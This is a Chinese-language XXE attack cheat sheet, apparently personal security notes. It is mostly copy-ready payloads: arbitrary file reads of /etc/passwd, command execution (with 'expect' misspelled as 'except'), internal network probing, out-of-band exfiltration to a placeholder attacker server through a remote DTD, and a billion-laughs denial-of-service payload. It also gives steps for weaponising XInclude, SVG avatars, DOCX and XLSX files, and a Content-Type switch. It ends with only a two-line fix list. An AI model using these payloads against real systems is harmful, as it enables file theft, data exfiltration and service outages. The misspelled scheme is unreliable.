# XXE

XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 外部实体 ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(盯好外部实体就行了)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面

## payload

### 有回显

读取任意文件

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY name SYSTEM "file:///etc/passwd">]>
    <root>&name;</root>
    
命令执行

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY name SYSTEM "except://ls">]>
    <root>&name;</root>

内网探测

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY name SYSTEM "http://192.168.1.1">]>
    <root>&name;</root>    
    
### 无回显

HTTP外带

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE ANY[
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % remote SYSTEM "http://攻击者服务器IP:8888/evil.xml">
    %remote;
    %all;
    %send;
    ]>
    <root>&name;</root>

evil.xml

    <!ENTITY % all "<!ENTITY % send SYSTEM 'http://攻击者服务器IP:8888/1.php?file=%file;'>">

拒绝服务攻击

    <?xml version="1.0"?>
    <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
 
 ## 场景
 
 ### 用户输入嵌入到服务端解析的XML文档
 
 比如：检查库存功能
 
 因为无法控制整个XML文档，所以无法定义DTD来发起经典的XXE攻击。但改用XInclude，XInclude是XML规范的一部分，它允许从子文档构建XML文档
 
 payload
 
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>
    
将payload替换库存的id

### 基于XML格式的文件，比如DOCX文档、SVG图像等

#### 比如：头像上传处

svg文件payload

    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
        <image xlink:href="expect://ls" width="200" height="200"></image>
    </svg>
    
然后头像就可能显示出数据

---

#### 比如：在线阅读DOCX文档、网站在线解析DOCX文档等功能

DOCX文档其实就是把一堆的XML文件按照一定的格式压缩在一起。

只需要把DOCX文档的后缀改为ZIP，并解压出其中的文件，就可以清晰地看到DOCX文档的“真实面貌“。

第一个回显位置：ord/document.xml文件中

在

    <?xml version.....>
    
的下方嵌入恶意代码

    <!DOCTYPE HACK[<!ENTITY Hack SYSTEM 'file:///etc/passwd'>]>
    
随后将这个压缩包的后缀名修改为DOCX，就得到了一个用于XXE攻击的DOCX文档

第二个回显位置：docProps/app.xml

找到控制页码的标签是<Pages>

    <Pages>1</Pages>
    
修改为

    <Pages><!DOCTYPE HACK[<!ENTITY Hack SYSTEM 'file:///etc/passwd'>]></Pages>
    
随后将这个压缩包的后缀名修改为DOCX，就得到了一个用于XXE攻击的DOCX文档

---

#### 比如：Excel文件

与上面的DOCX文件类似

把xlxs文档后缀改为zip，找到xl/workbook.xml文件

    <?xml version ....>

下方添加恶意代码

将压缩包后缀重新改回xlxs文件即可得到一个恶意Excel文件。

### 修改请求包内容类型

大多数POST请求使用由HTML表单生成的默认内容类型，例如application/x-www-form-urlencoded。

将

    POST /action HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 7
     
    foo=bar
    
修改为

    POST /action HTTP/1.0
    Content-Type: text/xml
    Content-Length: 52
     
    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>    
    
如果应用程序接受消息正文中包含XML请求，并将正文内容解析为XML，那么我们只需将请求重新修改XML格式，就可以达到隐藏的XXE攻击面。
    
## 漏洞修复

* 禁用外部实体
* 过滤关键字，如<!DOCTYPE 、<!ENTITY、SYSTEM和PUBLIC等